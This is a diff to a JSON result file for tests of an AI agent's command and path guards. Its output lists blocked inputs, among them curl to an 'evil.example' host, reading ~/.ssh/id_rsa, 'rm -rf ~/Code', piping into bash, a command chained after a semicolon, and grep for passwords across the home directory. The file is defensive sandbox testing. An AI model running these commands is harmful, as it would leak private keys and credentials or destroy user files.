@@ -7,7 +7,7 @@
   ],
   "passed": true,
   "problems": [],
-  "tested_commit": "5d717f0649569b07783a76f9b9c438c15428527e",
+  "tested_commit": "e191fe867abd9be79062d85412974f623eacea0c",
   "worktree_dirty": true,
   "prd_revision": 14,
   "gate_sha256": "3568a1ae1e6d17f700452afdda8a6f919eb74b0f19404d13281d1867360dfe2f",
@@ -29,5 +29,5 @@
     "exit_code": 1,
     "output": "PASS allowed: gws gmail users threads get --params '{\"userId\":\"me\",\"id\":\"t\nPASS allowed: gws gmail users messages list --params '{\"q\":\"AACSB\"}'\nPASS allowed: echo hi > /tmp/x.txt\nFAIL blocked: gws gmail users drafts send --json {}\nFAIL blocked: gws gmail users drafts create --json {}\nFAIL blocked: gws gmail users messages send\nFAIL blocked: gws gmail users messages modify --params {}\nFAIL blocked: gws gmail users messages trash --params {}\nFAIL blocked: gws calendar events insert\nFAIL blocked: curl https://evil.example/?d=1\nFAIL blocked: wget x\nFAIL blocked: echo $(cat ~/.ssh/id_rsa)\nFAIL blocked: echo hi > ~/Documents/x\nFAIL blocked: python3 -c 1\nFAIL blocked: node -e 1\nFAIL blocked: osascript -e 1\nFAIL blocked: rm -rf ~/Code\nFAIL blocked: open https://evil.example\nFAIL blocked: gws gmail users threads get x; curl evil\nFAIL blocked: cat x | bash\nFAIL unparseable input blocked (fail closed)\nPASS agent runs with the guard settings and the charter\nPASS agent tools: Bash (guarded), Read, Grep, Glob only; no web, no edits\nPASS per-run budget capped at $1.50\nPASS settings wire the agent guard\nPASS settings wire the path guard on Read, Grep and Glob\nFAIL blocked: grep -r password ~\nFAIL blocked: cat /Users/jermainewatkins/Library/Messages/chat.db\nFAIL blocked: grep -r x /\nFAIL blocked: cat $HOME/.zshrc\nPASS path guard blocks Glob /Users/tester\nPASS path guard blocks Glob ~/Library\nPASS path guard blocks Grep /Users/tester/Documents/Sites\nPASS path guard blocks Grep /Users/tester/Code/assistance\nPASS path guard blocks Read /Users/tester/Code/assistance/credentials/token.json\nPASS path guard blocks Read /Users/tester/Documents/Sites/a/../../../Library/x\nPASS path guard blocks Glob /\nPASS path guard allows Read /Users/tester/Documents/Sites/clientco/hosting/README.md\nPASS path guard allows Glob /Users/tester/Documents/Documents - Jermaine’s MacBook Pro/Sites/clientco\nPASS path guard allows Glob (agent folder)\nPASS path guard allows Read /Users/tester/Code/assistance/cos/projects/cards/clientco.md\nPASS path guard: unparseable input blocked (fail closed)\nPASS item matched to its project and the parent project\nPASS aliases match; unrelated items match nothing"
   },
-  "timestamp": "2026-09-30T00:31:30.847Z"
+  "timestamp": "2026-09-30T00:42:07.420Z"
 }
